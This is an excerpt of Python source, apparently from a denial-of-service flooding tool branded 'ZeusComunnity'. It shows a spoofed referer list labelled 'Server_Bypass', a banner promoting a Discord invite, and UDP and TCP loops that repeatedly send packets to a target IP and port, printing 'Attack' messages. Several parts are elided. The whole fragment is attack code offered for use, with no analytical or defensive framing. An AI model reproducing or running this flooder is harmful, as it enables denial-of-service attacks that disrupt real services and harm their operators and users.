...
referers = [
     'Server_Bypass_By_ZeusComunnity',
     'Server_Bypass_By_ZeusComunnity',
     'Server_Bypass_By_ZeusComunnity',
     'Server_Bypass_By_ZeusComunnity',
     'Server_Bypass_By_ZeusComunnity', 
...
\033[36m("------------------------------------------------------------")
\033[36m(" - - > TOOLS ZeusComunnity < - - ")
\033[36m(" - - > DISCORD : ZeusComunnity<- - ")                                   
\033[36m(" - - > JOIN OUR COMMUNITY ME< - - ")
\033[36m(" - - > https://discord.gg/vA8yzB8W < - - ")
\033[36m("------------------------------------------------------------")
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print("  ZeusComunnity %s Attack %s"%(ip,port))
		except:
			print("  ZeusComunnity %s Attack %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m Attack %s ZeusComunnity %s"%(ip,port))
